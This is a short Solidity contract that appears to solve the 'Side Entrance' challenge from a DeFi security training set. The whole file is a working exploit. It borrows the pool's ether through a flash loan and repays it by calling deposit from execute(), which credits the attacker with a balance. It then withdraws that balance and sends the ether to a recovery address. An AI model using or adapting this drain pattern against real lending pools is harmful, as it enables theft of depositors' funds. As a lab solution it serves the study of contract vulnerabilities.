pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack{
    SideEntranceLenderPool public pool;
    address public recovery;
    uint public exploitAmount;
    constructor(address _pool, address _recovery, uint _amount){  
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        exploitAmount = _amount;
    }

    function attack() external returns(bool){
        uint balanceBefore = address(this).balance;

        pool.flashLoan(exploitAmount);
        pool.withdraw();

        uint balanceAfter = address(this).balance;
        require(balanceAfter > balanceBefore, "Funds has not been transferred!");

        payable(recovery).transfer(exploitAmount);

        return true;
    }

    function execute() external payable{
        pool.deposit{value:msg.value}();
    }

}